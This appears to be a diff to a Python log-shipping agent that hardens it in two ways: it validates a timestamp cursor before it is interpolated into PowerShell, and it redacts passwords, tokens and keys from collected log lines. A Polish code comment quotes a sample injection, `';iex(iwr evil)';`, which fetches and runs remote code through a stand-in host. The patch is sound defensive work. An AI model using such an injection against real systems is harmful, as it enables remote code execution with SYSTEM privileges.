@@ -649,11 +649,17 @@ CRITICAL_EVENT_PATTERNS = [
 ]
 
 
+_CURSOR_RX = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d+)?$")
+
+
 def _load_event_cursor() -> str:
     try:
         if os.path.exists(_EVENT_CURSOR_FILE):
             with open(_EVENT_CURSOR_FILE) as f:
-                return json.load(f).get("lastTime", "")
+                v = json.load(f).get("lastTime", "")
+            # Cursor jest interpolowany do `[DateTime]'{cursor}'` w PowerShell.
+            # Lokalny admin podstawiający `';iex(iwr evil)';` dostałby SYSTEM RCE.
+            return v if isinstance(v, str) and _CURSOR_RX.match(v) else ""
     except Exception:
         pass
     return ""
@@ -796,6 +802,23 @@ def _is_error_line(src_type: str, line: str) -> bool:
     return "error" in low or "fail" in low or "fatal" in low
 
 
+_SECRET_PATTERNS = [
+    (re.compile(r"(password\s*[=:]\s*)\S+", re.IGNORECASE), r"\1***REDACTED***"),
+    (re.compile(r"(token\s*[=:]\s*)\S+", re.IGNORECASE), r"\1***REDACTED***"),
+    (re.compile(r"(api[_-]?key\s*[=:]\s*)\S+", re.IGNORECASE), r"\1***REDACTED***"),
+    (re.compile(r"(secret\s*[=:]\s*)\S+", re.IGNORECASE), r"\1***REDACTED***"),
+    (re.compile(r"(authorization\s*:\s*)\S+", re.IGNORECASE), r"\1***REDACTED***"),
+    (re.compile(r"(Bearer\s+)\S+", re.IGNORECASE), r"\1***REDACTED***"),
+    (re.compile(r"\b[A-Za-z0-9+/]{40,}={0,2}\b"), "***REDACTED-B64***"),
+]
+
+
+def _sanitize_log_line(line: str) -> str:
+    for pattern, repl in _SECRET_PATTERNS:
+        line = pattern.sub(repl, line)
+    return line
+
+
 def log_shipping_collect() -> dict:
     cfg = load_config()
     configured = cfg.get("logSources")
@@ -831,7 +854,7 @@ def log_shipping_collect() -> dict:
                 if not ln or ln.startswith("#"):
                     continue
                 if _is_error_line(stype, ln):
-                    errors.append(ln[:500])
+                    errors.append(_sanitize_log_line(ln[:500]))
                     if len(errors) >= _LOG_MAX_LINES_PER_FILE:
                         break
 
